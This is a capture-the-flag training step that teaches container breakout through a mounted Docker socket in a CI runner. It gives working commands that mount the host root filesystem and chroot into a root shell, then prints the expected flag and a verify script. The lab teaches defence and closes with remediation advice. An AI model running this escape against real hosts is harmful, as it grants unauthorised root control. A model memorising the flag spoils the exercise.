# Challenge 2: Container Breakout via Docker Unix Socket

## 📖 Background & Threat Landscape

In CI/CD environments, build workflows frequently require building and publishing new container images. To facilitate this without running complex nested virtualization, teams often implement **Docker-outside-of-Docker (DooD)** by mounting the host's Docker socket into the runner container:

```yaml
volumes:
  - /var/run/docker.sock:/var/run/docker.sock
```

### The Architectural Flaw

The Docker daemon (`dockerd`) runs as the host's **root** user. Any entity with write access to `/var/run/docker.sock` can send raw REST API requests to the daemon, instructing it to:
1. Pull arbitrary images.
2. Spin up containers in **privileged mode** (`--privileged`).
3. Bind-mount the **host's root filesystem (`/`)** into a container.
4. Execute kernel modifications or access host host secrets.

Consequently: **Mounting `/var/run/docker.sock` completely eliminates the container isolation boundary and confers root-equivalent access over the host machine (MITRE ATT&CK [T1611](https://attack.mitre.org/techniques/T1611/)).**

---

## 🛠️ Step-by-Step Instructions

### 1. Access the Container and Detect the Socket

Connect to `cicd_runner_pipeline` from your host terminal:

```bash
docker exec -it cicd_runner_pipeline sh
```

Verify that the Docker daemon socket is mounted inside the container:

```bash
ls -la /var/run/docker.sock
```

Notice the file permissions and ownership (`srw-rw---- root root`).

### 2. Query the Host Docker Daemon from Inside the Container

Run the `docker` client utility installed in the runner to communicate with the host daemon:

```bash
docker ps
```

Notice that you see the running containers on the **host machine**, including `cicd_runner_pipeline` itself!

### 3. Launch an Escape Container Mounting the Host Root Filesystem

Because you can control the host Docker daemon, launch a lightweight container (`alpine`) that mounts the host's entire root directory (`/`) into `/mnt/host`:

```bash
docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host sh
```

Let's break down this command:
- `docker run`: Instructs the host Docker daemon to create a new container.
- `-v /:/mnt/host`: Mounts the host's physical root filesystem (`/`) to `/mnt/host` inside the new container.
- `--rm`: Automatically cleans up the container upon exit.
- `chroot /mnt/host sh`: Executes the `chroot` system call, redefining `/` to `/mnt/host` and providing an interactive root shell on the host filesystem!

### 4. Retrieve the Host Root Flag

You are now operating inside the host filesystem with root authority. Verify your environment:

```bash
whoami
hostname
```

Read the host root flag located at `/root/host_flag.txt`:

```bash
cat /root/host_flag.txt
```

You should see:
`FLAG{host_takeover_via_docker_socket_alan_turing_2026}`

### 5. Exit the Breakout Shell and Record the Flag

Exit the `chroot` breakout session:

```bash
exit
```

Exit the `cicd_runner_pipeline` container session to return to the host terminal:

```bash
exit
```

Save the captured flag into `/tmp/flag2.txt` on the host:

```bash
echo "FLAG{host_takeover_via_docker_socket_alan_turing_2026}" > /tmp/flag2.txt
```

Confirm that the flag is saved:

```bash
cat /tmp/flag2.txt
```

---

## 🔍 DevSecOps Key Takeaway

> **Why did this happen?**
> The Docker daemon socket provides uncontrolled root access to the host kernel. Anyone who can interact with the socket can schedule containers that mount host devices and filesystems.
>
> **Production Remediation:**
> - **Never mount `/var/run/docker.sock` in untrusted or multi-tenant containers.**
> - Use daemonless, rootless container builders designed for unprivileged CI/CD pipelines:
>   - [Google Kaniko](https://github.com/GoogleContainerTools/kaniko): Builds container images from a Dockerfile inside a container or Kubernetes cluster without a Docker daemon.
>   - [Podman / Buildah](https://buildah.io/): Native unprivileged image building using user namespaces.
>   - [Sysbox](https://github.com/nestybox/sysbox): A container runtime (runc replacement) that enables true Docker-in-Docker isolation without security compromises.

---

## ✅ Verification

Click the **Check** button below or run the verification script directly from your terminal:

```bash
/step2/verify.sh
```
